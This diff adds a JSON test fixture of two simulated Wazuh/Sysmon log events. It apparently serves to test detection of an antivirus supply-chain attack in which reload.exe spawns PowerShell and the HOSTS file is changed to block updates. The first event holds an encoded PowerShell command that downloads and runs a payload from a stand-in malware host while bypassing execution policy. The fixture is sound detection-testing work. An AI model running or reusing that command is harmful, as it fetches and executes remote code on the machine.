@@ -1,0 +1,113 @@
+{
+  "_metadata": {
+    "attack_id": "T1059.001",
+    "variation": "001",
+    "name": "eScan Supply Chain - Malicious Reload.exe PowerShell",
+    "description": "Simulates eScan antivirus supply chain attack with reload.exe spawning encoded PowerShell",
+    "expected_detection": "CRITICAL",
+    "kill_chain_phase": "execution",
+    "source_url": "https://thehackernews.com/2026/02/escan-antivirus-update-servers.html",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Malicious reload.exe spawns PowerShell",
+      "sequence": 1,
+      "timestamp": "2026-02-03T10:15:00.000Z",
+      "log": {
+        "timestamp": "2026-02-03T10:15:00.000Z",
+        "rule": {
+          "level": 15,
+          "description": "Sysmon - Event 1: eScan reload.exe spawning PowerShell",
+          "id": "92151",
+          "mitre": {
+            "id": ["T1059.001", "T1562.001"],
+            "tactic": ["Execution", "Defense Evasion"],
+            "technique": ["Command and Scripting Interpreter: PowerShell", "Impair Defenses: Disable or Modify Tools"]
+          },
+          "groups": ["sysmon", "sysmon_event1", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1706950900.000010",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 10:15:00.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789030}",
+              "processId": "9124",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAHcAYQByAGUALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=",
+              "currentDirectory": "C:\\Program Files (x86)\\eScan\\",
+              "user": "NT AUTHORITY\\SYSTEM",
+              "integrityLevel": "System",
+              "hashes": "SHA256=de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
+              "parentProcessGuid": "{12345678-1234-1234-1234-123456789029}",
+              "parentProcessId": "6892",
+              "parentImage": "C:\\Program Files (x86)\\eScan\\reload.exe",
+              "parentCommandLine": "\"C:\\Program Files (x86)\\eScan\\reload.exe\""
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 11 - HOSTS file modification",
+      "sequence": 2,
+      "timestamp": "2026-02-03T10:15:10.000Z",
+      "log": {
+        "timestamp": "2026-02-03T10:15:10.000Z",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 11: HOSTS file modified to block updates",
+          "id": "92157",
+          "mitre": {
+            "id": ["T1562.001"],
+            "tactic": ["Defense Evasion"],
+            "technique": ["Impair Defenses: Disable or Modify Tools"]
+          },
+          "groups": ["sysmon", "sysmon_event11", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1706950910.000011",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "11",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-03 10:15:10.000",
+              "processGuid": "{12345678-1234-1234-1234-123456789030}",
+              "processId": "9124",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "targetFilename": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+              "creationUtcTime": "2026-02-03 10:15:10.000",
+              "user": "NT AUTHORITY\\SYSTEM"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    }
+  ]
+}
